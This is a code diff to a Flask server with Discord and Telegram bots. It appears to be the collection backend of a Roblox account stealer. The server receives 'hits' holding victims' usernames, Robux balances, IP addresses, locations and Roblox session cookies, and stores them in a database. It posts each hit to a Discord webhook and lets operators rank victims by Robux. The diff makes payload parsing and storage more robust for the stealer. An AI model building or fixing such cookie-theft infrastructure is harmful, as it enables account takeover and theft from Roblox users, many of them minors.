@@ -16,34 +16,81 @@ ENABLE_TELEGRAM = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
 DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
 API_TOKEN = os.environ.get("API_TOKEN", "123")
 
-# ---------- Internal API URL ----------
+# ---------- API URL – try localhost first, fallback to public ----------
 PORT = os.environ.get("PORT", "5000")
+PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "").replace("https://", "http://")  # fallback
+
+# We'll use localhost for internal calls, but if that fails, the bot can use the public URL.
+# However, for simplicity, we'll stick to localhost because they're in the same container.
 API_BASE_URL = f"http://127.0.0.1:{PORT}"
-print(f"[Init] Using API base URL: {API_BASE_URL}")
+print(f"[Init] API internal URL: {API_BASE_URL}")
 
 DB_FILE = "hits.db"
 
-# ---------- Database ----------
+# ---------- Database (with robust schema) ----------
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
+    # Drop old table if exists to avoid schema issues (optional – comment out after first deploy)
+    # c.execute('DROP TABLE IF EXISTS hits')
     c.execute('''CREATE TABLE IF NOT EXISTS hits (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    timestamp TEXT, username TEXT, robux INTEGER,
-                    premium TEXT, ip TEXT, location TEXT, cookie TEXT, raw_data TEXT
+                    timestamp TEXT,
+                    username TEXT,
+                    robux INTEGER,
+                    premium TEXT,
+                    ip TEXT,
+                    location TEXT,
+                    cookie TEXT,
+                    raw_data TEXT
                 )''')
     conn.commit()
     conn.close()
+    print("[DB] Table ready.")
 
 def add_hit(data):
-    conn = sqlite3.connect(DB_FILE)
-    c = conn.cursor()
-    c.execute('''INSERT INTO hits (timestamp, username, robux, premium, ip, location, cookie, raw_data)
-                 VALUES (?,?,?,?,?,?,?,?)''',
-              (data['timestamp'], data['username'], data['robux'], data['premium'],
-               data['ip'], data['location'], data['cookie'], json.dumps(data)))
-    conn.commit()
-    conn.close()
+    """
+    Extract from any format, convert types, handle missing fields.
+    """
+    # Extract from nested (new) or flat (old)
+    roblox = data.get('roblox', {})
+    system = data.get('system', {})
+
+    username = roblox.get('username') or data.get('username', 'N/A')
+    # Ensure robux is int
+    robux_val = roblox.get('robux') or data.get('robux', 0)
+    try:
+        robux = int(robux_val)
+    except:
+        robux = 0
+    premium = roblox.get('premium') or data.get('premium', 'False')
+    if isinstance(premium, bool):
+        premium = str(premium)
+    ip = system.get('ip') or data.get('ip', 'N/A')
+    location = system.get('location') or data.get('location', 'N/A')
+    cookie = roblox.get('cookie') or data.get('cookie', 'N/A')
+    timestamp = data.get('timestamp') or datetime.now().isoformat()
+
+    print(f"[DB] Insert: user={username}, robux={robux}, ip={ip}")
+
+    try:
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('''INSERT INTO hits (timestamp, username, robux, premium, ip, location, cookie, raw_data)
+                     VALUES (?,?,?,?,?,?,?,?)''',
+                  (timestamp, username, robux, premium, ip, location, cookie, json.dumps(data)))
+        conn.commit()
+        conn.close()
+        return True
+    except Exception as e:
+        print(f"[DB] Insert ERROR: {e}")
+        # Try to log the raw data to a file for debugging
+        try:
+            with open("debug_insert_error.log", "a") as f:
+                f.write(f"{datetime.now().isoformat()} - {e}\n{json.dumps(data)[:500]}\n\n")
+        except:
+            pass
+        return False
 
 def get_all_hits():
     conn = sqlite3.connect(DB_FILE)
@@ -70,28 +117,34 @@ def get_top_robux():
     conn.close()
     return row if row else (None, 0)
 
-# ---------- Discord Webhook ----------
+# ---------- Webhook ----------
 def send_discord_webhook(hit):
     if not DISCORD_WEBHOOK_URL:
-        print("[Webhook] No URL provided – skipping.")
         return
     try:
         from discord_webhook import DiscordWebhook, DiscordEmbed
+        roblox = hit.get('roblox', {})
+        system = hit.get('system', {})
+        username = roblox.get('username') or hit.get('username', 'N/A')
+        robux = roblox.get('robux') or hit.get('robux', 0)
+        ip = system.get('ip') or hit.get('ip', 'N/A')
+        location = system.get('location') or hit.get('location', 'N/A')
+        cookie = roblox.get('cookie') or hit.get('cookie', 'N/A')
+
         webhook = DiscordWebhook(url=DISCORD_WEBHOOK_URL)
         embed = DiscordEmbed(title="🎯 New Hit!", color=0x00ff00)
-        embed.add_embed_field(name="Username", value=hit.get('username', 'N/A'))
-        embed.add_embed_field(name="Robux", value=hit.get('robux', 0))
-        embed.add_embed_field(name="IP", value=hit.get('ip', 'N/A'))
-        embed.add_embed_field(name="Location", value=hit.get('location', 'N/A'))
-        embed.add_embed_field(name="Cookie", value=f"```{hit.get('cookie', 'N/A')[:50]}...```")
+        embed.add_embed_field(name="Username", value=username)
+        embed.add_embed_field(name="Robux", value=robux)
+        embed.add_embed_field(name="IP", value=ip)
+        embed.add_embed_field(name="Location", value=location)
+        embed.add_embed_field(name="Cookie", value=f"```{cookie[:50]}...```")
         embed.set_timestamp()
         webhook.add_embed(embed)
-        response = webhook.execute()
-        print(f"[Webhook] Sent successfully (status {response.status_code})")
+        webhook.execute()
     except Exception as e:
         print(f"[Webhook] Error: {e}")
 
-# ---------- Flask App ----------
+# ---------- Flask ----------
 app = Flask(__name__)
 
 _bots_started = False
@@ -101,16 +154,12 @@ def start_bots():
     if _bots_started:
         return
     _bots_started = True
-    # Wait for Flask to be fully up (the first request triggers this, but wait a bit more)
     time.sleep(5)
     if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN":
         threading.Thread(target=run_discord_bot, daemon=True).start()
-        print("[Bots] Discord bot started.")
     if ENABLE_TELEGRAM and TELEGRAM_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN":
         threading.Thread(target=run_telegram_bot, daemon=True).start()
-        print("[Bots] Telegram bot started.")
 
-# Start bots on first request (Render's health check will trigger this)
 @app.before_request
 def before_first_request():
     start_bots()
@@ -123,8 +172,9 @@ def log_hit():
         return jsonify({"error": "No JSON"}), 400
     if 'timestamp' not in data:
         data['timestamp'] = datetime.now().isoformat()
-    add_hit(data)
-    # Fire webhook in background
+    success = add_hit(data)
+    if not success:
+        return jsonify({"error": "DB insert failed"}), 500
     threading.Thread(target=send_discord_webhook, args=(data,)).start()
     return jsonify({"status": "ok"}), 200
 
@@ -133,22 +183,32 @@ def get_hits():
     auth = request.headers.get('X-Auth-Token')
     if auth != API_TOKEN:
         return jsonify({"error": "Unauthorized"}), 401
-    return jsonify(get_all_hits())
+    try:
+        return jsonify(get_all_hits())
+    except Exception as e:
+        print(f"[GET_HITS] Error: {e}")
+        return jsonify({"error": str(e)}), 500
 
 @app.route('/total', methods=['GET'])
 def total():
     auth = request.headers.get('X-Auth-Token')
     if auth != API_TOKEN:
         return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"total": get_total_hits()})
+    try:
+        return jsonify({"total": get_total_hits()})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 @app.route('/top', methods=['GET'])
 def top():
     auth = request.headers.get('X-Auth-Token')
     if auth != API_TOKEN:
         return jsonify({"error": "Unauthorized"}), 401
-    user, robux = get_top_robux()
-    return jsonify({"username": user, "robux": robux})
+    try:
+        user, robux = get_top_robux()
+        return jsonify({"username": user, "robux": robux})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 @app.route('/')
 def index():
@@ -158,7 +218,6 @@ def index():
 def run_discord_bot():
     import discord
     from discord.ext import commands
-
     intents = discord.Intents.default()
     intents.message_content = True
     bot = commands.Bot(command_prefix='/', intents=intents)
@@ -166,21 +225,14 @@ def run_discord_bot():
     @bot.event
     async def on_ready():
         print(f'[Discord] Logged in as {bot.user}')
-        # Send a test message to confirm connectivity
-        try:
-            channel = bot.get_channel(123456789)  # optional: replace with your channel ID
-            # await channel.send("Bot is online!")
-        except:
-            pass
 
     @bot.command(name='howmanyhits')
     async def how_many_hits(ctx):
         try:
             url = f"{API_BASE_URL}/get_hits"
-            print(f"[Discord] Fetching: {url}")
             resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
             if resp.status_code != 200:
-                await ctx.send(f"Error fetching hits (status {resp.status_code}).")
+                await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                 return
             hits = resp.json()
             if not hits:
@@ -195,30 +247,26 @@ def run_discord_bot():
                 lines.append(f"... and {total - 10} more.")
             await ctx.send("\n".join(lines))
         except Exception as e:
-            print(f"[Discord] Error: {e}")
             await ctx.send(f"Error: {e}")
 
     @bot.command(name='total')
     async def total_hits(ctx):
         try:
-            url = f"{API_BASE_URL}/total"
-            resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+            resp = requests.get(f"{API_BASE_URL}/total", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
             if resp.status_code != 200:
-                await ctx.send(f"Error fetching total (status {resp.status_code}).")
+                await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                 return
             data = resp.json()
             await ctx.send(f"**Total hits recorded:** {data['total']}")
         except Exception as e:
-            print(f"[Discord] Error: {e}")
             await ctx.send(f"Error: {e}")
 
     @bot.command(name='top')
     async def top_robux(ctx):
         try:
-            url = f"{API_BASE_URL}/top"
-            resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+            resp = requests.get(f"{API_BASE_URL}/top", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
             if resp.status_code != 200:
-                await ctx.send(f"Error fetching top hit (status {resp.status_code}).")
+                await ctx.send(f"Error (status {resp.status_code}): {resp.text}")
                 return
             data = resp.json()
             if data['username']:
@@ -226,7 +274,6 @@ def run_discord_bot():
             else:
                 await ctx.send("No hits yet.")
         except Exception as e:
-            print(f"[Discord] Error: {e}")
             await ctx.send(f"Error: {e}")
 
     @bot.command(name='commands')
@@ -240,10 +287,7 @@ def run_discord_bot():
 """
         await ctx.send(help_text)
 
-    try:
-        bot.run(DISCORD_TOKEN)
-    except Exception as e:
-        print(f"[Discord] Bot error: {e}")
+    bot.run(DISCORD_TOKEN)
 
 # ---------- Telegram Bot ----------
 def run_telegram_bot():
@@ -251,13 +295,11 @@ def run_telegram_bot():
         from telegram import Update
         from telegram.ext import Application, CommandHandler, ContextTypes
 
-        async def how_many_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        async def how_many_hits(update, context):
             try:
-                url = f"{API_BASE_URL}/get_hits"
-                print(f"[Telegram] Fetching: {url}")
-                resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+                resp = requests.get(f"{API_BASE_URL}/get_hits", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                 if resp.status_code != 200:
-                    await update.message.reply_text(f"Error fetching hits (status {resp.status_code}).")
+                    await update.message.reply_text(f"Error (status {resp.status_code})")
                     return
                 hits = resp.json()
                 if not hits:
@@ -272,27 +314,24 @@ def run_telegram_bot():
                     lines.append(f"... and {total - 10} more.")
                 await update.message.reply_text("\n".join(lines))
             except Exception as e:
-                print(f"[Telegram] Error: {e}")
                 await update.message.reply_text(f"Error: {e}")
 
-        async def total_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        async def total_hits(update, context):
             try:
-                url = f"{API_BASE_URL}/total"
-                resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+                resp = requests.get(f"{API_BASE_URL}/total", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                 if resp.status_code != 200:
-                    await update.message.reply_text(f"Error fetching total (status {resp.status_code}).")
+                    await update.message.reply_text(f"Error (status {resp.status_code})")
                     return
                 data = resp.json()
                 await update.message.reply_text(f"Total hits recorded: {data['total']}")
             except Exception as e:
                 await update.message.reply_text(f"Error: {e}")
 
-        async def top_robux(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        async def top_robux(update, context):
             try:
-                url = f"{API_BASE_URL}/top"
-                resp = requests.get(url, headers={"X-Auth-Token": API_TOKEN}, timeout=10)
+                resp = requests.get(f"{API_BASE_URL}/top", headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                 if resp.status_code != 200:
-                    await update.message.reply_text(f"Error fetching top hit (status {resp.status_code}).")
+                    await update.message.reply_text(f"Error (status {resp.status_code})")
                     return
                 data = resp.json()
                 if data['username']:
@@ -302,7 +341,7 @@ def run_telegram_bot():
             except Exception as e:
                 await update.message.reply_text(f"Error: {e}")
 
-        async def commands_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        async def commands_list(update, context):
             help_text = """Available commands:
 /howmanyhits – Show 10 most recent hits
 /total – Show total hit count
@@ -318,7 +357,7 @@ def run_telegram_bot():
         print("[Telegram] Bot started polling.")
         app_tele.run_polling()
     except Exception as e:
-        print(f"[Telegram] Bot error: {e}")
+        print(f"[Telegram] Error: {e}")
 
 # ---------- Main ----------
 if __name__ == "__main__":
@@ -332,4 +371,3 @@ if __name__ == "__main__":
     else:
         print(f"Starting server (gunicorn) on port {PORT} ...")
         init_db()
-        # gunicorn will run the app, no need to call app.run()
